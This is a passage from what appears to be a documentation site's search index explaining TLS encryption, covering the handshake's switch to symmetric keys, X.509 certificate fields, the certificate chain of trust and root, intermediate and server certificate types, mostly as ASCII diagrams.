  Pre-Master Secret,\n\u2502   Client Random,                          \u2502   Client Random,\n\u2502   Server Random                           \u2502   Server Random\n\u2502 )                                         \u2502 )\n\u2502                                           \u2502\nStep 5: Finished (Switch to Symmetric)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 \"Finished\" (encrypted with Session Key)   \u2502\n\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n\u2502                                           \u2502 Verify\n\u2502                                           \u2502\n\u2502                                           \u2502 \"Finished\"\n\u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 (encrypted)\n\u2502 Verify                                    \u2502\n\u2502                                           \u2502\nStep 6: Secure Communication (Symmetric Encryption)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588                  \u2502\n\u2502 Application Data (AES Encrypted)          \u2502\n\u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n\u2502                                           \u2502\n\u2502                                           \u2502 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 Response (AES)\n\u2502                                           \u2502\n\nSUMMARY:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. Handshake uses ASYMMETRIC encryption (slow but secure key exchange)\n   - Server sends public key in certificate\n   - Client encrypts session key with server's public key\n   - Server decrypts with private key\n\n2. Data transfer uses SYMMETRIC encryption (fast)\n   - Both sides use the same session key (AES-256-GCM)\n   - All application data encrypted with this key\n   - Session key is temporary (only for this connection)\n</code></pre> <p>Why Use Both Asymmetric and Symmetric?</p> <pre><code>ASYMMETRIC (RSA/ECC):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Securely exchange the symmetric key\nUsed: Only during handshake\nAdvantage: No shared secret needed beforehand\nDisadvantage: Too slow for bulk data\n\n        \u2193 Handshake Complete \u2193\n\nSYMMETRIC (AES):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPurpose: Encrypt actual data\nUsed: All application data\nAdvantage: Very fast, efficient\nDisadvantage: Both parties need the key\n\nRESULT: Best of both worlds!\n</code></pre>"},{"location":"security/encryption/#digital-certificates-and-certificate-authorities","title":"Digital Certificates and Certificate Authorities","text":"<p>What is a Digital Certificate?</p> <p>A digital certificate is an electronic document that proves the ownership of a public key. It's like a digital passport that verifies identity in the online world.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Digital Certificate Structure                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  X.509 Certificate                         \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                            \u2502\n\u2502  Certificate Information:                                  \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502 Version: 3                                           \u2502 \u2502\n\u2502  \u2502 Serial Number: 0x4f3a2e1d9c8b7a6f                    \u2502 \u2502\n\u2502  \u2502                                                      \u2502 \u2502\n\u2502  \u2502 SUBJECT (Certificate Owner):                         \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Common Name (CN): www.example.com                 \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Organization (O): Example Corp                    \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Country (C): US                                   \u2502 \u2502\n\u2502  \u2502                                                      \u2502 \u2502\n\u2502  \u2502 ISSUER (Who signed this):                            \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Common Name (CN): DigiCert TLS RSA SHA256 CA     \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Organization (O): DigiCert Inc                    \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Country (C): US                                   \u2502 \u2502\n\u2502  \u2502                                                      \u2502 \u2502\n\u2502  \u2502 VALIDITY PERIOD:                                     \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Not Before: 2025-01-01 00:00:00 UTC              \u2502 \u2502\n\u2502  \u2502 \u2514\u2500 Not After:  2026-01-01 23:59:59 UTC              \u2502 \u2502\n\u2502  \u2502                                                      \u2502 \u2502\n\u2502  \u2502 PUBLIC KEY INFO:                                     \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Algorithm: RSA                                    \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Key Size: 2048 bits                              \u2502 \u2502\n\u2502  \u2502 \u2514\u2500 Public Key: 30 82 01 0a 02 82 01 01 00 b4...    \u2502 \u2502\n\u2502  \u2502                                                      \u2502 \u2502\n\u2502  \u2502 EXTENSIONS:                                          \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Subject Alternative Names:                        \u2502 \u2502\n\u2502  \u2502 \u2502  \u2022 www.example.com                                \u2502 \u2502\n\u2502  \u2502 \u2502  \u2022 example.com                                    \u2502 \u2502\n\u2502  \u2502 \u2502  \u2022 *.example.com                                  \u2502 \u2502\n\u2502  \u2502 \u251c\u2500 Key Usage: Digital Signature, Key Encipherment   \u2502 \u2502\n\u2502  \u2502 \u2514\u2500 Extended Key Usage: TLS Web Server Auth          \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2502                                                            \u2502\n\u2502  SIGNATURE (by CA):                                        \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n\u2502  \u2502 Signature Algorithm: sha256WithRSAEncryption         \u2502 \u2502\n\u2502  \u2502 Signature Value:                                     \u2502 \u2502\n\u2502  \u2502 5f:3a:2e:1d:9c:8b:7a:6f:4e:3d:2c:1b:9a:8f:7e:6d... \u2502 \u2502\n\u2502  \u2502 (CA's private key encrypted hash of certificate)    \u2502 \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPURPOSE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2705 Proves server owns the public key\n\u2705 Binds public key to domain name (www.example.com)\n\u2705 Signed by trusted Certificate Authority (CA)\n\u2705 Prevents man-in-the-middle attacks\n</code></pre>"},{"location":"security/encryption/#certificate-chain-of-trust","title":"Certificate Chain of Trust","text":"<p>How Trust Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              Certificate Chain of Trust                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nLEVEL 1: Root CA (Top of Trust Hierarchy)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      ROOT CERTIFICATE AUTHORITY            \u2502\n\u2502                                            \u2502\n\u2502  Name: DigiCert Global Root CA             \u2502\n\u2502  Status: Self-Signed (trust anchor)        \u2502\n\u2502  Validity: 30+ years                       \u2502\n\u2502  Location: Pre-installed in browsers/OS    \u2502\n\u2502                                            \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502  \u2502 Private Key (Ultra Secure)       \u2502     \u2502\n\u2502  \u2502 - Kept offline in HSM            \u2502     \u2502\n\u2502  \u2502 - Physical security              \u2502     \u2502\n\u2502  \u2502 - Rarely used                    \u2502     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502 Signs \u2193\n                  \u2502\nLEVEL 2: Intermediate CA (Middle Layer)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    INTERMEDIATE CERTIFICATE                \u2502\n\u2502                                            \u2502\n\u2502  Name: DigiCert TLS RSA SHA256 2020 CA1    \u2502\n\u2502  Signed by: DigiCert Global Root CA        \u2502\n\u2502  Validity: 5-10 years                      \u2502\n\u2502  Purpose: Issues end-entity certificates   \u2502\n\u2502                                            \u2502\n\u2502  Why Intermediate?                         \u2502\n\u2502  \u2713 Protects root CA private key            \u2502\n\u2502  \u2713 Can be revoked if compromised           \u2502\n\u2502  \u2713 Easier to manage/rotate                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502 Signs \u2193\n                  \u2502\nLEVEL 3: End-Entity (Server Certificate)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      SERVER CERTIFICATE                    \u2502\n\u2502                                            \u2502\n\u2502  Domain: www.example.com                   \u2502\n\u2502  Signed by: DigiCert TLS RSA SHA256 CA     \u2502\n\u2502  Validity: 1 year (typically)              \u2502\n\u2502  Contains: Server's public key             \u2502\n\u2502                                            \u2502\n\u2502  Used for:                                 \u2502\n\u2502  \u2713 TLS/HTTPS connections                   \u2502\n\u2502  \u2713 Proving server identity                 \u2502\n\u2502  \u2713 Encrypting session keys                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nVERIFICATION FLOW:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nBrowser receives Server Certificate\n         \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Is it signed by     \u2502\n    \u2502 trusted Intermediate?\u2502 \u2190 Check signature\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502 YES\n           \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Is Intermediate     \u2502\n    \u2502 signed by           \u2502 \u2190 Check signature\n    \u2502 trusted Root CA?    \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502 YES\n           \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Is Root CA in       \u2502\n    \u2502 browser's trust     \u2502 \u2190 Check trust store\n    \u2502 store?              \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502 YES\n           \u2193\n    \u2705 CERTIFICATE TRUSTED!\n\nIf any step fails \u2192 \u274c WARNING: Untrusted Certificate!\n</code></pre>"},{"location":"security/encryption/#types-of-certificates","title":"Types of Certificates","text":"<p>1. Root CA Certificate</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  ROOT CA CERTIFICATE                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCHARACTERISTICS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Self-signed (signs itself)\n\u2022 Pre-installed in browsers, OS, devices\n\u2022 Extremely long validity (20-30 years)\n\u2022 Private key stored offline in Hardware Security Module (HSM)\n\u2022 Highest level of trust\n\nEXAMPLES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2713 DigiCert Global Root CA\n\u2713 GlobalSign Root CA\n\u2713 Let's Encrypt Root CA (ISRG Root X1)\n\u2713 VeriSign/Symantec roots\n\nWHERE STORED:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Windows: Certificate Manager (certmgr.msc)\n\u2022 macOS: Keychain Access \u2192 System Roots\n\u2022 Linux: /etc/ssl/certs/\n\u2022 Browsers: Firefox has own trust store\n\nUSAGE:\n\u2500\u2500\u2500\u2500\u2500\u2500\n\u274c NOT used directly for TLS\n\u2705 Only signs intermediate CA certificates\n\u2705 Root of trust for entire chain\n</code></pre> <p>2. Intermediate CA Certificate</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              INTERMEDIATE CA CERTIFICATE                     \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nCHARACTERISTICS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Signed by Root CA\n\u2022 Signs end-entity certificates (server, client)\n\u2022 Medium validity (5-10 years)\n\u2022 Can be revoked without affecting root\n\u2022 Multiple intermediates can exist\n\nWHY USE INTERMEDIATES?\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nSECURITY:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Root CA Private Key                  \u2502\n\u2502 \u251c\u2500 Kept offline in secure facility   \u2502\n\u2502 \u251c\u2500 Air-gapped from internet          \u2502\n\u2502 \u251c\u2500 Physical security (vault)         \u2502\n\u2502 \u2514\u2500 Used only to sign intermediates   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n              \u2502\n              \u2193 Signs\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Intermediate CA Private Key          \u2502\n\u2502 \u251c\u2500 Online, can issue certificates    \u2502\n\u2502 \u251c\u2500 If compromised, revoke this CA    \u2502\n\u2502 \u2514\u2500 Root CA remains secure            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nFLEXIBILITY:\n\u2022 Different intermediates for different purposes:\n  - One for web servers\n  - One for email\n  - One for code signing\n\u2022 Easy to revoke and replace\n\nEXAMPLE CHAIN:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDigiCert Global Root G2 (Root)\n    \u2514\u2500\u2500 DigiCert TLS RSA SHA256 2020 CA1 (Intermediate)\n            \u2514\u2500\u2500 www.example.com (Server)\n</code></pre> <p>3. Server Certificate (TLS/SSL Certificate)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  SERVER CERTIFICATE                          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPURPOSE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nProves web server's identity and encrypts traffic\n\nCONTAINS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Domain name(s): www.example.com, example.com\n\u2022 Server's public key (RSA or ECC)\n\u2022 Validity period (typically 90 days to 1 year)\n\u2022 Issuer (Intermediate CA)\n\u2022 Signature (signed by Intermediate CA)\n\nTYPES OF SERVER CERTIFICATES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. DOMAIN VALIDATED (DV) - Basic\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 Validation: Domain control \u2502\n   \u2502 Time: Minutes              \u2502\n   \u2502 Cost: Free - $50/year      